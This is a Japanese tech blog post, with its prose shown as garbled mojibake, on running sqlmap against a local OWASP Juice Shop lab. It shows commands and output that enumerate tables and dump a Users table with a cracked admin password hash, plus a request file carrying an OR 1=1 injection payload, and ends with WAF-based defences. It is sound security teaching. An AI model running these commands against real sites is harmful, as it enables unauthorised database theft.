---
title: "SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã«å¯¾æŠ—ã™ã‚‹ãŸã‚ã«sqlmapã‚’ä½¿ã£ã¦SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’ä½“é¨“ã—ã¦ã¿ãŸ"
emoji: "ğŸ’€"
type: "tech" # tech: æŠ€è¡“è¨˜äº‹ / idea: ã‚¢ã‚¤ãƒ‡ã‚¢
topics: ["security","sqlmap","sqlinjection"]
published: true
---

ã“ã‚“ã«ã¡ã¯ã€‚  
ã”æ©Ÿå«Œã„ã‹ãŒã§ã—ã‚‡ã†ã‹ã€‚  
"No human labor is no human error" ãŒå¤§å¥½ããª[å‰äº• äº®](https://twitter.com/YoshiiRyo1)ã§ã™ã€‚  

zenn ã«å¼•ã£è¶Šã—ã¾ã—ãŸã€‚å¼•ã£è¶Šã™å‰ã®ãƒ–ãƒ­ã‚°ã¯[ã“ã¡ã‚‰](https://dev.classmethod.jp/author/yoshii-ryo/)ã§ã™ã€‚  

SQL ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã«èˆˆå‘³ãŒã²ã‹ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã€ã„ã‚ã„ã‚ã¨èª¿ã¹ã¦ã„ãã†ã¡ã« sqlmap ã¨ã„ã†ãƒ„ãƒ¼ãƒ«ã‚’è¦‹ã¤ã‘ã¾ã—ãŸã€‚  
sqlmap ã¯ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ã«ä¾µå…¥ãƒ†ã‚¹ãƒˆãƒ„ãƒ¼ãƒ«ã§ SQL ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã«ç‰¹åŒ–ã—ã¦ã„ã¾ã™ã€‚  

@[card](https://sqlmap.org/)

## OWASP Juice Shop

sqlmap ã‚’è©¦ã™ãŸã‚ã«è„†å¼±æ€§ã‚’ã‚ãˆã¦æŒã£ãŸã‚µã‚¤ãƒˆã‚’æ§‹ç¯‰ã—ã¾ã™ã€‚  
OWASP ã®èª¬æ˜ã«ã¯ã€Œprobably the most modern and sophisticated insecure web application!(æ©Ÿæ¢°ç¿»è¨³: ãŠãã‚‰ãæœ€ã‚‚æœ€æ–°ã§æ´—ç·´ã•ã‚ŒãŸå®‰å…¨ã§ãªã„ Web ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³)ã€ã¨æ›¸ã„ã¦ã‚ã‚Šã¾ã™ã€‚
Juice Shop ã§ã‚ã‚Œã° SQL ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®å‹‰å¼·ãŒå­˜åˆ†ã«ã§ãã‚‹ã¯ãšã§ã™ã€‚  

@[card](https://owasp.org/www-project-juice-shop/)  

### Juice Shop ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«

[Docker Image](https://hub.docker.com/r/bkimminich/juice-shop) ãŒç”¨æ„ã•ã‚Œã¦ã„ã¾ã™ã€‚ã•ãã£ã¨ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã§ãã¾ã—ãŸã€‚  
ä»Šå›ã¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚°ãƒ«ãƒ¼ãƒ—ã‚’ç©ºã‘ãªã„ EC2 ä¸Šã«æ§‹ç¯‰ã—ã¦ã„ã¾ã™ã€‚ä¸Šãƒªãƒ³ã‚¯ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã‚³ãƒãƒ³ãƒ‰ãŒè¨˜è¿°ã•ã‚Œã¦ã„ã‚‹ã®ã§ãã®é€šã‚Šã«å®Ÿæ–½ã™ã‚‹ã ã‘ã§ã™ã€‚  

```bash
sudo yum update -y
sudo yum install -y docker
sudo systemctl enable docker
sudo systemctl start docker
sudo docker pull bkimminich/juice-shop
sudo docker run -d -p 80:3000 bkimminich/juice-shop
```

## sqlmap

[sqlmap](https://sqlmap.org/) ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚Zip Ballã€Tar Ballã€Git Clone ã‹ä½•ã‚Œã‹éƒ½åˆã®è‰¯ã„æ‰‹æ®µã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦ãã ã•ã„ã€‚  
æœ¬ã‚¨ãƒ³ãƒˆãƒªã§ã¯ Juice Shop ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ãŸåŒã˜ EC2 ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ä¸Šã«ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦å®Ÿè¡Œã—ã¦ã„ã¾ã™ã€‚  

[sqlmap](https://sqlmap.org/) ã«ã‚‚æ˜è¨˜ã•ã‚Œã¦ã„ã‚‹é€šã‚Šã€ã‚µã‚¤ãƒˆæ‰€æœ‰è€…ã®åˆæ„ç„¡ã—ã« sqlmap ã‚’ä½¿ã£ã¦ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã‚’ã™ã‚‹ã“ã¨ã¯æ­¢ã‚ã¾ã—ã‚‡ã†ã€‚ã‚‚ã—ãã†ã—ã¦ã—ã¾ã£ãŸå ´åˆã€å…¨ã¦ã®è²¬ä»»ã¯å®Ÿè¡Œã—ãŸäººé–“ã«ã‚ã‚Šã¾ã™ã€‚ã‚ãã¾ã§è‡ªåˆ†ãŒç®¡ç†ã—ã¦ã„ã‚‹ã‚µã‚¤ãƒˆã®ã¿ã«ã—ã¾ã—ã‚‡ã†ã€‚  

> Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

### ãƒ†ã‚¹ãƒˆã—ã¦ã¿ãŸ

#### DBMS ã‚’æ¢ã‚Šã‚ã¦ã‚‹

ãã‚Œã§ã¯ã€sqlmap ã‚’è©¦ã—ã¦ã¿ã¾ã™ã€‚  
å„ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã®æ„å‘³ã¯ `-hh` ã‚’ä»˜ã‘ã‚‹ã‹ [usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage) ã‚’ã”è¦§ãã ã•ã„ã€‚  

`-u` ã¯ã‚¿ãƒ¼ã‚²ãƒƒãƒˆ URL ã§ã™ã€‚Juice Shop ã¯ `/rest/products/search` ãŒå•†å“æ¤œç´¢æ©Ÿèƒ½ã¨ãªã£ã¦ã„ã¾ã™ã€‚ã“ã“ã«è„†å¼±æ€§ãŒã‚ã‚Šã¾ã™ã€‚(ã“ã“ä»¥å¤–ã«ã‚‚ã‚ã‚Šã¾ã™ãŒåˆ†ã‹ã‚Šã‚„ã™ã„ã®ã§)  
`--banner` ã‚’ä»˜ã‘ã¦ã‚µã‚¤ãƒˆãŒä½¿ç”¨ã—ã¦ã„ã‚‹ DBMS ã¨ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’æ¢ã£ã¦ã¿ã¾ã™ã€‚  
`--random-agent` ã¯ User-Agent ã‚’ãƒ©ãƒ³ãƒ€ãƒ ã§ç”Ÿæˆã—ã¾ã™ã€‚  
`--batch` ã¯å¯¾è©±å‹ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’å…¨ã¦ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§é€²ã‚ã¦ãã‚Œã¾ã™ã€‚sqlmap ã¯å®Ÿè¡Œé€”ä¸­ã«ä½•åº¦ã‹ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’èã‹ã‚Œã¾ã™ã€‚å…¥åŠ›ã‚’çœç•¥ã—ãŸã„éš›ã«ä½¿ã„ã¾ã™ã€‚  

```bash
$ python3 sqlmap.py -u http://localhost/rest/products/search?q= --random-agent --batch --banner
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.7.2#dev}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[01:53:57] [INFO] the back-end DBMS is SQLite
[01:53:57] [INFO] fetching banner
[01:53:57] [INFO] resumed: 3.41.1
back-end DBMS: SQLite
banner: '3.41.1'
```

SQLite 3.41.1 ã¨ã„ã†ã“ã¨ãŒåˆ¤æ˜ã—ã¾ã—ãŸã€‚  
Juice Shop ã®ã‚µã‚¤ãƒˆã«ã‚‚æ›¸ã„ã¦ã‚ã‚Šã¾ã™ã€‚ã‚ã£ã•ã‚Šã¨ DBMS ãŒãƒãƒ¬ã¦ã—ã¾ã„ã¾ã—ãŸã€‚  
![img](https://raw.githubusercontent.com/juice-shop/pwning-juice-shop/master/introduction/img/architecture-diagram.png)  

#### ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒªã‚¹ãƒˆã‚’å–å¾—

`--dbs` ã‚’ä»˜ã‘ã‚‹ã¨ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒªã‚¹ãƒˆãŒå–å¾—å¯èƒ½ã§ã™ã€‚  

```bash
$ python3 sqlmap.py -u http://localhost/rest/products/search?q= --random-agent --batch --dbs
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.7.2#dev}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[01:56:02] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[01:56:02] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
```

ãŠã£ã¨ã€ã©ã†ã‚„ã‚‰ SQLite ã¯ `--dbs` ã«å¯¾å¿œã—ã¦ã„ãªã„ã‚ˆã†ã§ã™ã€‚  
`use only '--tables'` ã¨ã„ã†ã“ã¨ãªã®ã§ãã®é€šã‚Šã‚„ã£ã¦ã¿ã¾ã™ã€‚  

#### ãƒ†ãƒ¼ãƒ–ãƒ«ãƒªã‚¹ãƒˆã‚’å–å¾—

`--tables` ã‚’ä»˜ã‘ã¦ãƒ†ãƒ¼ãƒ–ãƒ«ãƒªã‚¹ãƒˆã‚’å–å¾—ã—ã¾ã™ã€‚  
ã‚µã‚¤ãƒˆã¸æ¥ç¶šã—ãŸãƒ¦ãƒ¼ã‚¶ãƒ¼(ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å†…ã§ DBMS æ¥ç¶šã«ä½¿ç”¨ã—ã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼)ãŒå–å¾—ã§ãã‚‹ãƒ†ãƒ¼ãƒ–ãƒ«ã‚’è¡¨ç¤ºã™ã‚‹ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã®ã‚ˆã†ã§ã™ã€‚  

```bash
$ python3 sqlmap.py -u http://localhost/rest/products/search?q= --random-agent --batch --tables
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.7.2#dev}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[01:56:13] [INFO] fetching tables for database: 'SQLite_masterdb'

[20 tables]
+-------------------+
| Addresses         |
| BasketItems       |
| Baskets           |
| Captchas          |
| Cards             |
| Challenges        |
| Complaints        |
| Deliveries        |
| Feedbacks         |
| ImageCaptchas     |
| Memories          |
| PrivacyRequests   |
| Products          |
| Quantities        |
| Recycles          |
| SecurityAnswers   |
| SecurityQuestions |
| Users             |
| Wallets           |
| sqlite_sequence   |
+-------------------+
```

ãªã‚“ã¨ãƒ†ãƒ¼ãƒ–ãƒ«ãƒªã‚¹ãƒˆãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸã€‚ã“ã‚Œã¯ç”±ã€…ã—ãäº‹æ…‹ã§ã™ã€‚  
Users ã¯ã‚µã‚¤ãƒˆä¼šå“¡ã§ã—ã‚‡ã†ã€‚ç§ãŒæ”»æ’ƒè€…ãªã‚‰ Wallets ã¯èˆˆå‘³ãŒã‚ããƒ†ãƒ¼ãƒ–ãƒ«ã§ã™ã€‚  

#### Usersãƒ†ãƒ¼ãƒ–ãƒ«ã®ãƒ‡ãƒ¼ã‚¿ã‚’å–å¾—

ãƒ†ãƒ¼ãƒ–ãƒ«ãƒªã‚¹ãƒˆã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ãŸã€‚ãã‚Œã§ã¯ã€Users ãƒ†ãƒ¼ãƒ–ãƒ«ã®ãƒ‡ãƒ¼ã‚¿ã‚’è¡¨ç¤ºã•ã›ã¦ã¿ã¾ã—ã‚‡ã†ã€‚  
`--dump` ã§ãƒ†ãƒ¼ãƒ–ãƒ«ãƒ‡ãƒ¼ã‚¿ã‚’è¡¨ç¤ºã•ã›ã¾ã™ã€‚  
`-T` ã§ãƒ†ãƒ¼ãƒ–ãƒ«ã®æŒ‡å®šã€`-D` ãŒãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®æŒ‡å®šã§ã™ã€‚  
`--threads` ã¯ sqlmap ã®ã‚¹ãƒ¬ãƒƒãƒ‰æ•°ã§ã™ã€‚1 ã ã¨é…ã„ã®ã§ãŠå¥½ã¿ã§å¢—ã‚„ã—ã¦ãã ã•ã„ã€‚  

```bash
$ python3 sqlmap.py -u http://localhost/rest/products/search?q= --random-agent --batch --dump -D SQLite_masterdb -T Users --threads 5
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.7.7.2#dev}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[02:20:32] [INFO] using hash method 'md5_generic_passwd'
[02:20:32] [INFO] using hash method 'sha256_generic_passwd'
[02:20:32] [INFO] resuming password 'admin123' for hash '0192023a7bbd73250516f069df18b500'

Table: Users
[20 entries]
+----+------------+----------------------------+----------+---------------------------------------------+------------+--------------------------------+--------------------------------+--------------------------------+----------------------------------+------------------------------------------------------------------+-------------+-----------------------------------------------+
| id | role       | email                      | isActive | password                                    | username   | createdAt                      | deletedAt                      | updatedAt                      | totpSecret                       | deluxeToken                                                      | lastLoginIp | profileImage                                  |
+----+------------+----------------------------+----------+---------------------------------------------+------------+--------------------------------+--------------------------------+--------------------------------+----------------------------------+------------------------------------------------------------------+-------------+-----------------------------------------------+
| 9  | admin      | J12934@juice-sh.op         | 1        | 0192023a7bbd73250516f069df18b500 (admin123) | <blank>    | 2023-07-27 01:42:10.212 +00:00 | NULL                           | 2023-07-27 01:42:10.212 +00:00 | <blank>                          | <blank>                                                          | <blank>     | assets/public/images/uploads/defaultAdmin.png |

```

Users ãƒ†ãƒ¼ãƒ–ãƒ«ãŒä¸¸è¦‹ãˆã§ã™ã€‚(å®Ÿè¡Œä¾‹ã§ã¯çœç•¥ã—ã¦ã„ã¾ã™ãŒå…¨ãƒ¦ãƒ¼ã‚¶ãƒ¼è¦‹ãˆã¾ã™)  
è¦ªåˆ‡ãªã“ã¨ã«ãƒãƒƒã‚·ãƒ¥åŒ–ã•ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚‚è¾æ›¸æ”»æ’ƒã§è§£æã—ã¦ã„ã¾ã™ã€‚  
ã“ã‚Œã¯å€‹äººçš„ãªäºˆæƒ³ã§ã™ãŒ admin ãƒ­ãƒ¼ãƒ«ã‚’æŒã£ãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ J12934@juice-sh.op ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¯ admin123 ãªã‚“ã ã‚ã†ãªãã£ã¨ã€‚  

### ä»–ã«

ä»Šå›ä½¿ã‚ãªã‹ã£ãŸã‚ªãƒ—ã‚·ãƒ§ãƒ³ã®ãªã‹ã«æ°—ã«ãªã‚‹ã‚‚ã®ãŒã‚ã‚‹ã®ã§ç´¹ä»‹ã—ã¾ã™ã€‚  

#### ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãƒ†ã‚­ã‚¹ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰ã®èª­ã¿å‡ºã—

`-r` ã‚’ä»˜ã‘ã‚‹ã¨ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãƒ†ã‚­ã‚¹ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰èª­ã¿å‡ºã—ã¦å®Ÿè¡Œå¯èƒ½ã§ã™ã€‚  
å®Ÿéš›ã®ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã§ã¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ˜ãƒƒãƒ€ãƒ¼ã‚„ POST Body ã‚’ç´°ã‹ãæŒ‡å®šã™ã‚‹å ´é¢ãŒã‚ã‚‹ã¨æ€ã„ã¾ã™ã€‚ã‚³ãƒãƒ³ãƒ‰ã®é•·ã„ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä»˜ã‘ã‚‹ã‚ˆã‚Šã‚‚ä¾¿åˆ©ã§ã™ã€‚ä½¿ã„å›ã—ã‚‚ã§ãã¾ã™ã­ã€‚  

ä¾‹ãˆã° `request-post.txt` ã‚’ä½œã£ã¦ãŠã„ã¦ `-r` ã§æŒ‡å®šã™ã‚‹ã‚ˆã†ãªä½¿ã„æ–¹ã§ã™ã€‚  

```text:request-post.txt
POST /rest/user/login HTTP/1.1
Host: yoursitefqdn:443
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: ja,en-US;q=0.9,en;q=0.8
Content-Type: application/json
Cookie: language=en; hoge=usedcar
Referer: https://yoursitefqdn/
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36

{email: "hoge' OR 1=1;", password: "abc"}
```

```bash
$ sqlmap -r request-post.txt
```

#### ãƒ¬ãƒ™ãƒ«ã¨ãƒªã‚¹ã‚¯

sqlmap ã§å®Ÿè¡Œã™ã‚‹ãƒ¬ãƒ™ãƒ«ã¨ãƒªã‚¹ã‚¯ã‚’ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºã—ã¾ã™ã€‚  

`--level`
ãƒ¬ãƒ™ãƒ«ã¯5æ®µéšã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã¯1ã§ã™ã€‚  
ãƒ¬ãƒ™ãƒ«ã‚’ä¸Šã’ã‚‹ã»ã©å¤šæ•°ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã©ãƒ—ãƒ¬ãƒ•ã‚£ãƒƒã‚¯ã‚¹/ã‚µãƒ•ã‚£ãƒƒã‚¯ã‚¹ã®çµ„ã¿åˆã‚ã›ãŒè©¦ã•ã‚Œã¾ã™ã€‚
ã¾ãŸã€ãƒ¬ãƒ™ãƒ«2ã‹ã‚‰ã¯ Cookie ãŒã€ãƒ¬ãƒ™ãƒ«3ã‹ã‚‰ã¯ User-Agent ã¨ Referer ãŒãƒ†ã‚¹ãƒˆã«è¿½åŠ ã•ã‚Œã¾ã™ã€‚  

`--risk`
ãƒªã‚¹ã‚¯ã¯3æ®µéšã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã¯1ã§ã™ã€‚  
ãƒ¬ãƒ™ãƒ«ã‚’ä¸Šã’ã‚‹ã»ã©å®Ÿè¡Œæ™‚ã«ãƒªã‚¹ã‚¯ãŒä¸ŠãŒã£ã¦ã„ãã¾ã™ã€‚  
ãƒ¬ãƒ™ãƒ«2ã§ã¯ time-base SQL ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãŒã€ãƒ¬ãƒ™ãƒ«3ã§ã¯OR-base SQL ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚  
ã“ã‚Œã¯ãƒ†ã‚¹ãƒˆå®Ÿè¡Œè€…ãŒæœ›ã¾ãªã„ SQLã€Update ã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆã¸ã®ãƒ†ã‚¹ãƒˆã§ãƒ‡ãƒ¼ã‚¿ãŒç ´å£Šã•ã‚Œã‚‹ãªã©ã‹ã‚‰å›é¿ã™ã‚‹ãŸã‚ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã§ã™ã€‚  

## SQL ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³å¯¾ç­–

ã¤ã„ã§ã¨ã„ã†ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ãŒã€SQL ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯ä»Šã§ã‚‚ä¸Šä½3ã«å…¥ã‚‹ãã‚‰ã„ã«äººæ°—ã®ã‚ã‚‹(?)æ”»æ’ƒã§ã™ã€‚  
ãŸã ã€å¯¾ç­–æ–¹æ³•ã‚‚ã‚ã‚Šã¾ã™ã®ã§ã€ã—ã£ã‹ã‚Šå¯¾ç­–ã—ã¦ã„ããŸã„ã‚‚ã®ã§ã™ã€‚  

sqlmap ã«ã‚ˆã‚‹ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã¯ AWS WAF ã§é˜²ã’ã¾ã—ãŸã€‚
Core rule set (CRS) managed rule group ã¨ SQL database managed rule group ã‚’å°å…¥ã—ã¾ã—ã‚‡ã†ã€‚  

ã“ã®ã‚ãŸã‚Šã¯åˆ¥ã®ã‚¨ãƒ³ãƒˆãƒªã§è§£èª¬ã—ã¦ã„ã¾ã™ã€‚  
[Web ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æ”»æ’ƒã‹ã‚‰å®ˆã‚‹æ–¹æ³•ã‚’èª¿ã¹ã¦ã¿ãŸ](https://zenn.dev/ryoyoshii/articles/c987cc5273c405)  

ã“ã¡ã‚‰ã‚‚å¤§å¤‰å‚è€ƒã«ãªã‚‹ã®ã§é–‹ç™ºè€…ã®æ–¹ã¯å‚ç…§ãã ã•ã„ã€‚  
[å®‰å…¨ãªã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®ä½œã‚Šæ–¹ - 1.1 SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³](https://www.ipa.go.jp/security/vuln/websecurity/sql.html)  

## ã¾ã¨ã‚

sqlmap ã‚’ SQL ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã‚’è©¦ã—ã¦ã¿ã¾ã—ãŸã€‚  
SQL ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®å¯¾ç­–ã‚’ã—ã¦ã„ãªã„ã‚µã‚¤ãƒˆã¯ã¨ã¦ã‚‚ç°¡å˜ã«ä¾µå…¥ã•ã‚Œã¦ã—ã¾ã†å¯èƒ½æ€§ãŒã‚ã‚‹ã¨ã„ã†ã“ã¨ãŒç†è§£ã§ãã¾ã—ãŸã€‚  
ã‚³ãƒãƒ³ãƒ‰æ•°å›å®Ÿè¡Œã™ã‚‹ã ã‘ã§ Admin ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ã‚²ãƒƒãƒˆã—ã¾ã—ãŸã€‚ä»Šå›ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ†ãƒ¼ãƒ–ãƒ«ã§ã—ãŸãŒãƒ†ãƒ¼ãƒ–ãƒ«åã•ãˆåˆ¤æ˜ã—ã¦ã—ã¾ãˆã°ã‚ã‚‰ã‚†ã‚‹ãƒ‡ãƒ¼ã‚¿ã‚’æ¼æ´©ã—ã¾ã™ã€‚å¯¾ç­–ã®é‡è¦æ€§ã‚’æ”¹ã‚ã¦æ„Ÿã˜ã¾ã—ãŸã€‚  

## å‚è€ƒ

[OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)  
[sqlmap](https://sqlmap.org/)  
[sqlmap Cheat Sheat](https://www.comparitech.com/net-admin/sqlmap-cheat-sheet/)  
[6 sqlmap cheat sheets to help you find SQL injections](https://cybr.com/ethical-hacking-archives/sqlmap-cheat-sheets-to-help-you-find-sql-injections/)  
[å®‰å…¨ãªã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®ä½œã‚Šæ–¹](https://www.ipa.go.jp/security/vuln/websecurity/about.html)  
